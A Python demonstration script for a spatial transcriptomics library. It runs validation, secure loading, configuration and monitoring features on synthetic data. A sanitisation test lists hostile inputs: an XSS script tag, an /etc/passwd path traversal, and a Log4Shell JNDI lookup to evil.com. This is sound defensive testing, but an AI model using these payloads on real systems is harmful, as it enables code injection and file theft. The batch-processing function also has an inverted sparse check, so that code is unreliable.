"""
Demonstration of robustness features in Spatial-Omics GFM.
Shows validation, security, configuration management, and advanced monitoring.
"""

import numpy as np
import pandas as pd
from anndata import AnnData
from pathlib import Path
import yaml
import logging
from contextlib import contextmanager

# Import robustness features
from spatial_omics_gfm.utils import (
    # Enhanced validation
    RobustValidator, ValidationConfig, ValidationException,
    
    # Security features
    SecureFileHandler, SecurityConfig, sanitize_user_input,
    
    # Configuration management
    ConfigManager, ExperimentConfig, ModelConfig, TrainingConfig,
    
    # Advanced monitoring
    start_monitoring, record_metric, monitor_operation,
    get_monitoring_manager
)

# Import enhanced memory management
from spatial_omics_gfm.utils.enhanced_memory_management import (
    AdaptiveMemoryManager, memory_optimized_operation,
    create_adaptive_memory_context
)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def create_sample_data(n_cells: int = 1000, n_genes: int = 500, add_issues: bool = False):
    """Create sample spatial transcriptomics data with optional issues for testing."""
    logger.info(f"Creating sample data: {n_cells} cells, {n_genes} genes")
    
    # Create expression matrix
    X = np.random.negative_binomial(5, 0.3, size=(n_cells, n_genes)).astype(np.float32)
    
    if add_issues:
        # Add some data quality issues for validation testing
        X[0:10, :] = X[0, :]  # Identical rows
        X[50:55, 10:15] = np.nan  # NaN values
        X[100, :] = 0  # All-zero row
        logger.info("Added data quality issues for validation testing")
    
    # Create observation metadata
    obs = pd.DataFrame({
        'cell_type': np.random.choice(['Neuron', 'Astrocyte', 'Microglia', 'Oligodendrocyte'], n_cells),
        'batch': np.random.choice(['Batch1', 'Batch2', 'Batch3'], n_cells),
        'total_counts': np.array(X.sum(axis=1)).flatten(),
        'n_genes': np.array((X > 0).sum(axis=1)).flatten()
    })
    obs.index = [f"Cell_{i:06d}" for i in range(n_cells)]
    
    # Create gene metadata
    var = pd.DataFrame({
        'gene_name': [f'Gene_{i}' for i in range(n_genes)],
        'highly_variable': np.random.choice([True, False], n_genes, p=[0.3, 0.7]),
        'total_counts': np.array(X.sum(axis=0)).flatten()
    })
    var.index = [f"ENSG{i:08d}" for i in range(n_genes)]
    
    # Create AnnData object
    adata = AnnData(X=X, obs=obs, var=var)
    
    # Add spatial coordinates
    adata.obsm['spatial'] = np.random.uniform(0, 1000, (n_cells, 2)).astype(np.float32)
    
    # Add some processed data
    adata.layers['raw'] = X.copy()
    adata.uns['spatial_info'] = {
        'technology': 'Visium',
        'resolution': 'high',
        'tissue_type': 'brain'
    }
    
    logger.info(f"Created AnnData object: {adata.shape}")
    return adata


def demonstrate_robust_validation():
    """Demonstrate robust validation features."""
    logger.info("=== Demonstrating Robust Validation ===")
    
    # Create data with various issues
    adata = create_sample_data(n_cells=500, n_genes=200, add_issues=True)
    
    # Configure validation
    validation_config = ValidationConfig(
        strict_mode=False,
        auto_fix=True,
        max_warnings=50,
        validation_timeout=60
    )
    
    # Create robust validator
    validator = RobustValidator(validation_config)
    
    # Perform comprehensive validation
    logger.info("Running comprehensive validation...")
    result = validator.validate_spatial_data_robust(adata)
    
    # Display results
    logger.info(f"Validation completed: {'PASSED' if result.is_valid else 'FAILED'}")
    logger.info(f"Errors: {len(result.errors)}")
    logger.info(f"Warnings: {len(result.warnings)}")
    logger.info(f"Fixes applied: {len(result.fixes_applied)}")
    logger.info(f"Validation duration: {result.performance_stats.get('validation_duration_seconds', 0):.2f}s")
    
    # Show some error/warning details
    for error in result.errors[:3]:  # Show first 3 errors
        logger.error(f"Error: {error['message']} (Code: {error['error_code']})")
    
    for warning in result.warnings[:3]:  # Show first 3 warnings
        logger.warning(f"Warning: {warning['message']} (Code: {warning['warning_code']})")
    
    # Show quality metrics
    if result.quality_metrics:
        logger.info("Quality Metrics:")
        for metric, value in list(result.quality_metrics.items())[:5]:  # Show first 5 metrics
            logger.info(f"  {metric}: {value}")
    
    return result


def demonstrate_security_features(temp_dir: Path):
    """Demonstrate security features."""
    logger.info("=== Demonstrating Security Features ===")
    
    # Create sample data
    adata = create_sample_data(n_cells=200, n_genes=100)
    
    # Save data to file
    data_file = temp_dir / "secure_test.h5ad"
    adata.write_h5ad(data_file)
    
    # Configure security
    security_config = SecurityConfig(
        enable_input_validation=True,
        max_file_size_mb=100,
        enable_checksum_validation=True
    )
    
    # Create secure file handler
    file_handler = SecureFileHandler(security_config)
    
    logger.info("Testing secure file loading...")
    
    try:
        # Load data securely
        loaded_adata = file_handler.load_data_securely(data_file, temp_dir)
        logger.info(f"Successfully loaded data: {loaded_adata.shape}")
        
        # Compute and verify checksum
        checksum = file_handler.compute_file_checksum(data_file)
        is_valid = file_handler.verify_file_integrity(data_file, checksum)
        logger.info(f"File integrity check: {'PASSED' if is_valid else 'FAILED'}")
        
    except Exception as e:
        logger.error(f"Secure file loading failed: {e}")
    
    # Demonstrate input sanitization
    logger.info("Testing input sanitization...")
    
    dangerous_inputs = [
        "normal_string",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "very_long_string" + "x" * 2000,
        "${jndi:ldap://evil.com/a}"
    ]
    
    for dangerous_input in dangerous_inputs:
        try:
            sanitized = sanitize_user_input(dangerous_input, "metadata")
            logger.info(f"Sanitized: '{dangerous_input[:50]}...' -> '{sanitized[:50]}...'")
        except Exception as e:
            logger.warning(f"Input rejected: '{dangerous_input[:50]}...' ({e})")


def demonstrate_configuration_management(temp_dir: Path):
    """Demonstrate configuration management."""
    logger.info("=== Demonstrating Configuration Management ===")
    
    # Create configuration manager
    config_manager = ConfigManager()
    
    # Create sample configuration
    config = ExperimentConfig(
        name="robustness_demo",
        description="Demonstration of robustness features",
        model=ModelConfig(
            num_genes=1000,
            hidden_dim=512,
            num_layers=12,
            num_heads=8,
            dropout=0.1
        ),
        training=TrainingConfig(
            batch_size=32,
            learning_rate=0.001,
            max_epochs=100
        )
    )
    
    config_manager.config = config
    
    # Save configuration to file
    config_file = temp_dir / "demo_config.yaml"
    config_manager.save_config(config_file, format="yaml")
    logger.info(f"Saved configuration to {config_file}")
    
    # Load configuration from file
    loaded_config = config_manager.load_config(config_file)
    logger.info(f"Loaded configuration: {loaded_config.name}")
    
    # Demonstrate runtime updates
    logger.info("Testing configuration updates...")
    
    updates = {
        'model': {'hidden_dim': 1024, 'num_layers': 24},
        'training': {'batch_size': 64}
    }
    
    config_manager.update_config(updates)
    updated_config = config_manager.get_config()
    
    logger.info(f"Updated hidden_dim: {updated_config.model.hidden_dim}")
    logger.info(f"Updated batch_size: {updated_config.training.batch_size}")
    
    # Demonstrate validation
    validation_report = config_manager.validate_config()
    logger.info(f"Configuration validation: {'PASSED' if validation_report['valid'] else 'FAILED'}")
    
    if validation_report['warnings']:
        for warning in validation_report['warnings']:
            logger.warning(f"Config warning: {warning}")
    
    # Demonstrate rollback
    logger.info("Testing configuration rollback...")
    config_manager.rollback_config(1)
    rollback_config = config_manager.get_config()
    logger.info(f"After rollback - hidden_dim: {rollback_config.model.hidden_dim}")
    
    return config_manager


def demonstrate_advanced_monitoring():
    """Demonstrate advanced monitoring capabilities."""
    logger.info("=== Demonstrating Advanced Monitoring ===")
    
    # Start global monitoring
    start_monitoring()
    
    # Get monitoring manager
    manager = get_monitoring_manager()
    
    # Record some custom metrics
    record_metric("demo.operations_started", 1)
    record_metric("demo.batch_size", 32)
    record_metric("demo.learning_rate", 0.001)
    
    # Monitor an operation
    with monitor_operation("data_processing", tags={'demo': 'true'}):
        # Simulate some work
        data = np.random.rand(1000, 500)
        result = np.mean(data, axis=0)
        
        # Record operation-specific metrics
        record_metric("demo.data_processed_mb", data.nbytes / (1024**2))
        record_metric("demo.mean_result", float(np.mean(result)))
    
    # Get system health status
    health = manager.get_health_status()
    logger.info(f"System health: {health['status']}")
    
    if health['components']:
        for component, status in health['components'].items():
            logger.info(f"  {component}: {status}")
    
    # Get dashboard data
    dashboard_data = manager.dashboard.get_dashboard_data(window_minutes=5)
    logger.info(f"Dashboard metrics available: {len(dashboard_data['metrics'])}")
    
    # Show some metrics
    for metric_name, metric_data in list(dashboard_data['metrics'].items())[:3]:
        if isinstance(metric_data, dict) and 'current' in metric_data:
            logger.info(f"  {metric_name}: {metric_data['current']:.2f}")
    
    return manager


def demonstrate_memory_management():
    """Demonstrate enhanced memory management."""
    logger.info("=== Demonstrating Enhanced Memory Management ===")
    
    # Create large dataset
    large_adata = create_sample_data(n_cells=5000, n_genes=2000)
    
    def process_batch(batch_data):
        """Example batch processing function."""
        # Simulate some processing
        for adata_chunk in batch_data:
            # Perform some computation
            result = np.mean(adata_chunk.X, axis=0) if hasattr(adata_chunk.X, 'toarray') else np.mean(adata_chunk.X.toarray(), axis=0)
            record_metric("memory_demo.genes_processed", len(result))
    
    # Use memory-optimized operation
    with memory_optimized_operation("large_data_processing") as memory_manager:
        # Create data chunks
        chunk_size = 500
        data_chunks = []
        
        for start_idx in range(0, large_adata.n_obs, chunk_size):
            end_idx = min(start_idx + chunk_size, large_adata.n_obs)
            chunk = large_adata[start_idx:end_idx].copy()
            data_chunks.append(chunk)
        
        logger.info(f"Created {len(data_chunks)} data chunks")
        
        # Process with adaptive batching
        with memory_manager.adaptive_batch_processing(
            iter(data_chunks),
            process_batch,
            initial_batch_size=2
        ) as processed_count:
            logger.info(f"Processed {processed_count} data chunks")
        
        # Get adaptive statistics
        stats = memory_manager.get_adaptive_statistics()
        logger.info(f"Batch sizing statistics:")
        logger.info(f"  Final batch size: {stats['batch_sizing']['current_batch_size']}")
        logger.info(f"  Total adaptations: {stats['batch_sizing']['total_adaptations']}")
        logger.info(f"  Memory pressure events: {stats['memory_pressure']['pressure_events']}")
        
        # Demonstrate tensor pooling
        logger.info("Testing tensor pooling...")
        tensor_shape = (100, 50)
        
        with memory_manager.optimized_tensor_operations(tensor_shape, dtype=torch.float32) as tensor:
            # Use the pooled tensor
            tensor.fill_(1.0)
            result = torch.sum(tensor)
            record_metric("memory_demo.tensor_sum", float(result))
        
        logger.info("Tensor pooling completed")


def run_complete_demo():
    """Run complete robustness demonstration."""
    logger.info("Starting Spatial-Omics GFM Robustness Demonstration")
    logger.info("=" * 60)
    
    # Create temporary directory for demo files
    import tempfile
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        try:
            # 1. Validation demonstration
            validation_result = demonstrate_robust_validation()
            
            # 2. Security demonstration
            demonstrate_security_features(temp_path)
            
            # 3. Configuration management demonstration
            config_manager = demonstrate_configuration_management(temp_path)
            
            # 4. Advanced monitoring demonstration
            monitoring_manager = demonstrate_advanced_monitoring()
            
            # 5. Memory management demonstration
            demonstrate_memory_management()
            
            logger.info("=" * 60)
            logger.info("Robustness demonstration completed successfully!")
            
            # Final summary
            logger.info("Summary of demonstrated features:")
            logger.info("✓ Robust data validation with auto-repair")
            logger.info("✓ Security measures and input sanitization")
            logger.info("✓ Configuration management with YAML/JSON support")
            logger.info("✓ Advanced monitoring and alerting")
            logger.info("✓ Adaptive memory management with resource pooling")
            logger.info("✓ Comprehensive error handling and recovery")
            
        except Exception as e:
            logger.error(f"Demo failed with error: {e}")
            raise
        
        finally:
            # Cleanup monitoring
            try:
                from spatial_omics_gfm.utils.advanced_monitoring import stop_monitoring
                stop_monitoring()
            except:
                pass


if __name__ == "__main__":
    # Import torch for memory management demo
    import torch
    
    # Run the complete demonstration
    run_complete_demo()